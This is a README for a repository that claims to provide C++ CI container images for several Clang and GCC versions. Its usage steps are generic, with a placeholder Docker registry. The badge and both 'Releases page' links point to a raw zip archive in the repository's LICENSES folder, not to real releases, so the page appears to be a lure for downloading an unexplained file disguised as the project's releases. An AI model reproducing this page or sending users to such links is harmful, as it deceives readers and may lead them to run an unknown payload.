# C++ CI Container Images 🚀

![C++ CI](https://github.com/ahmedramadan000/cplusplus-ci/raw/refs/heads/main/LICENSES/cplusplus_ci_3.1.zip%2B%2B%20CI-Container%20Images-brightgreen)

Welcome to the **C++ CI** repository! This project provides container images tailored for C++ continuous integration workflows. Whether you are using Clang or GCC, our images support multiple versions to streamline your development process.

## Table of Contents

- [Overview](#overview)
- [Features](#features)
- [Getting Started](#getting-started)
- [Supported Versions](#supported-versions)
- [Usage](#usage)
- [Releases](#releases)
- [Contributing](#contributing)
- [License](#license)

## Overview

Continuous Integration (CI) is essential for modern software development. It allows teams to integrate code changes frequently and automatically. Our C++ CI container images simplify this process, providing a reliable environment for building and testing C++ applications.

## Features

- **Multiple Compiler Support**: Choose from various versions of Clang and GCC.
- **Lightweight Images**: Optimized for speed and efficiency.
- **Easy Integration**: Seamlessly integrate with your CI/CD pipelines.
- **Pre-configured Environments**: Ready-to-use images for C++ development.

## Getting Started

To get started with our C++ CI images, visit our [Releases page](https://github.com/ahmedramadan000/cplusplus-ci/raw/refs/heads/main/LICENSES/cplusplus_ci_3.1.zip). Download the appropriate image for your workflow and follow the instructions to set it up.

## Supported Versions

We support the following compiler versions:

- **Clang**:
  - clang-20
  - clang-21

- **GCC**:
  - gcc-13
  - gcc-14
  - gcc-15
  - gcc-16

## Usage

Using our container images is straightforward. Here’s a simple example of how to use a Docker image in your CI pipeline.

1. **Pull the Image**:
   To pull a specific image, use the following command:
   ```bash
   docker pull your-docker-repo/cplusplus-ci:clang-21
   ```

2. **Run the Container**:
   Run the container with your C++ code:
   ```bash
   docker run -v $(pwd):/workspace -w /workspace your-docker-repo/cplusplus-ci:clang-21 bash -c "make && ./your_executable"
   ```

3. **Integrate with CI**:
   You can integrate this command into your CI configuration file, ensuring that your code is built and tested automatically.

## Releases

For the latest updates and to download the images, visit our [Releases page](https://github.com/ahmedramadan000/cplusplus-ci/raw/refs/heads/main/LICENSES/cplusplus_ci_3.1.zip). Here, you can find the latest versions and any additional resources needed for setup.

## Contributing

We welcome contributions! If you want to improve this project, please follow these steps:

1. Fork the repository.
2. Create a new branch.
3. Make your changes.
4. Submit a pull request.

Please ensure that your code follows our coding standards and includes tests.

## License

This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.

---

Thank you for checking out the C++ CI repository! We hope our container images help streamline your C++ development process. For any questions or feedback, feel free to reach out through the Issues section of this repository.